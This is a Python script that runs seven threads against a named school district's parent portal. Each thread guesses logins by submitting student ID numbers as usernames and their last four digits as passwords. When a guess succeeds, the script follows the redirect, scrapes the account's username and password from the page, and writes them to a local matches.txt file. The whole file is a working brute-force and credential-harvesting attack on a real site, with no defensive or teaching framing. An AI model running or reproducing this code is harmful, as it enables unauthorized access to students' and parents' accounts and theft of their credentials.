from bs4 import BeautifulSoup
import mechanize
from colored import fg, bg, attr
import logging
import threading
import time


# Declare custom strip function
def downwithit(string, firstHalf, secondHalf):
    string = str(string)
    format1 = string.replace(str(firstHalf), "")
    format2 = format1.replace(str(secondHalf), "")
    return format2


# Thread A - 4600000000-4610000000
def thread_a(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4600000000, 4610000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread B - 4610000001-4620000000
def thread_b(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4610000001, 4620000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread C - 4620000001-4630000000
def thread_c(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4620000001, 4630000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread D - 4630000001-4640000000
def thread_d(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4630000001, 4640000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread E - 4640000001-4650000000
def thread_e(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4640000001, 4650000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread F - 4650000001-4660000000
def thread_f(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4650000001, 4660000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


# Thread G - 4660000001-4670000000
def thread_g(name):
    logging.info("Thread %s: starting", name)

    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    # Set colors
    green = fg('#00FF00')
    orange = fg('#FFFF00')
    res = attr('reset')

    # Set user class

    class user:
        firstname = "N/A"
        lastname = "N/A"
        studentid = "N/A"
        username = "N/A"
        password = "N/A"
        birthmonth = "N/A"

    # Declare user class
    user = user()

    for x in range(4660000001, 4670000000):
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)

        # Set bruteforce combo
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            # Try to select form, if missing then combo was found
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            # Notify there was a match
            print("[RUN] " + green + "Found " + user.studentid + "..." + res)

            # Retrieve redirect url embedded in js code
            soup = BeautifulSoup(br.response().read(), 'lxml')
            formatted = str(soup)
            newUrl = downwithit(
                formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
            br.open("https://dashboard.okaloosaschools.com" + newUrl)

            # # Scrape and format web data
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]

            # Write to file
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()

            # Debug process time
            end = time.time()
            delta = end - start
            print("[DEBUG] " + orange
                  + "Took " + str(round(delta, 2)) + "s to process match..." + res)
            pass
    logging.info("Thread %s: finishing", name)


if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")

    logging.info("Main    : before creating thread")
    a = threading.Thread(target=thread_a, args=(1,))
    b = threading.Thread(target=thread_b, args=(2,))
    c = threading.Thread(target=thread_c, args=(3,))
    d = threading.Thread(target=thread_d, args=(4,))
    e = threading.Thread(target=thread_e, args=(5,))
    f = threading.Thread(target=thread_f, args=(6,))
    g = threading.Thread(target=thread_g, args=(7,))

    logging.info("Main    : before running thread")
    a.start()
    b.start()
    c.start()
    d.start()
    e.start()
    f.start()
    g.start()
    logging.info("Main    : wait for the thread to finish")
    # x.join()
    logging.info("Main    : all done")
